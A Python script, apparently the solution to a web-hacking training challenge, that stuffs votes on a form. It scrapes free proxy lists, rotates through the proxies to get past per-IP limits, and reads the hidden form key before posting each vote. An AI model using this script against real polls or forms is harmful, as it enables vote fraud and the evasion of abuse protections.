#!/usr/local/bin/python3
from bs4 import BeautifulSoup
import requests
import sys
from PIL import Image
import urllib
from operator import itemgetter
import pytesseract as tess
from fp.fp import FreeProxy

success_votes = 0
error_cases = 0
user_id = 3014
number_print = 98
url = "http://158.69.76.135/level4.php"
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
     AppleWebKit/537.36 (KHTML, like Gecko)\
     Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0',
    'Referer': url
}
proxy = { "http": '' }
proxy_sites = ["https://www.free-proxy-list.net/", "https://www.us-proxy.org/"]
rotate = 0
z = 0

for i in range(0, number_print):
    cookies_page = requests.session()
    cookies_page.headers.update(header)
    flag = 0

    page = cookies_page.get(proxy_sites[rotate])
    rotate = 1 if rotate == 0 else 0
    soup = BeautifulSoup(page.text, "html.parser")
    proxy_list = soup.find("tbody").find_all("tr")

    for ip in proxy_list:
        proxy["http"] = "http://" + ip.find("td").text
        print("Cheking {}".format(proxy["http"]))
        print("sending = '{}'".format(proxy))
        z += 1
    
        try:
            cookies_page = requests.session()
            page = cookies_page.get(url, headers=header, proxies=proxy, timeout=5)
            print("Receiving '{}'".format(proxy))
            cookies_page = requests.session()
            cookies_page.headers.update(header)

            # Obtein the key
            r = cookies_page.get(url, headers=header, proxies=proxy, timeout=5)
            soup = BeautifulSoup(r.text, "lxml")
            key_value = soup.find('form').find('input', {'name': 'key'})['value']
            # Create the data and send it
            votation = {'id': user_id, 'holdthedoor': 'Submit', 'key': key_value}
            vote = cookies_page.post(url, headers=header, data=votation, proxies=proxy, timeout=5)

            if vote.status_code == 200:
                success_votes += 1
                print("Succes: ", success_votes)
        except Exception as error:
            print("Error: ", error)
            error_cases += 1
            i -= 1

print("-------------------")
print("print success: {}".format(success_votes))
print("error_cases: {}".format(error_cases), file=sys.stderr)
print("-------------------")
if error_cases == 0:
    print("Success operation: 100% of {} votes".format(success_votes))
